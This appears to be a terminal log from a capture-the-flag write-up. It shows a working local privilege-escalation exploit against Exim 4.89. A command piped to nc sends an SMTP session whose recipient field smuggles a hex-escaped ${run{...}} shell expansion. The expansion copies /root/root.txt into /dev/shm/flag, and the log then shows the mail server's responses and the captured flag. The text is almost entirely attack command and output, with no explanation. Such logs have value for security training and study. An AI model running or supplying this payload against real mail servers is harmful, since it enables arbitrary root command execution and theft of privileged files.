scavenger> touch /dev/shm/flag;(sleep 0.1 ; echo HELO foo ; sleep 0.1 ; echo 'MAIL FROM:<>' ; sleep 0.1 ; echo 'RCPT TO:<${run{\x2Fbin\x2Fsh\x09-c\x09\x22cat\x09\x2Froot\x2Froot.txt\x3E\x3E\x2Fdev\x2Fshm\x2Fflag\x22}}@localhost>' ; sleep 0.1 ; echo DATA ; sleep 0.1 ; echo "Received: 1" ; echo "Received: 2" ;echo "Received: 3" ;echo "Received: 4" ;echo "Received: 5" ;echo "Received: 6" ;echo "Received: 7" ;echo "Received: 8" ;echo "Received: 9" ;echo "Received: 10" ;echo "Received: 11" ;echo "Received: 12" ;echo "Received: 13" ;echo "Received: 14" ;echo "Received: 15" ;echo "Received: 16" ;echo "Received: 17" ;echo "Received: 18" ;echo "Received: 19" ;echo "Received: 20" ;echo "Received: 21" ;echo "Received: 22" ;echo "Received: 23" ;echo "Received: 24" ;echo "Received: 25" ;echo "Received: 26" ;echo "Received: 27" ;echo "Received: 28" ;echo "Received: 29" ;echo "Received: 30" ;echo "Received: 31" ;echo "" ; echo "." ; echo QUIT) | nc 127.0.0.1 25
220 ib01.supersechosting.htb ESMTP Exim 4.89 Tue, 27 Aug 2019 08:22:09 +0200
250 ib01.supersechosting.htb Hello localhost [127.0.0.1]
250 OK
250 Accepted
354 Enter message, ending with "." on a line by itself
250 OK id=1i2Urp-0000m2-Dy
221 ib01.supersechosting.htb closing connection

scavenger> cat /dev/shm/flag
4a08d8174e9ec22b01d91ddb9a732b17
4a08d8174e9ec22b01d91ddb9a732b17

```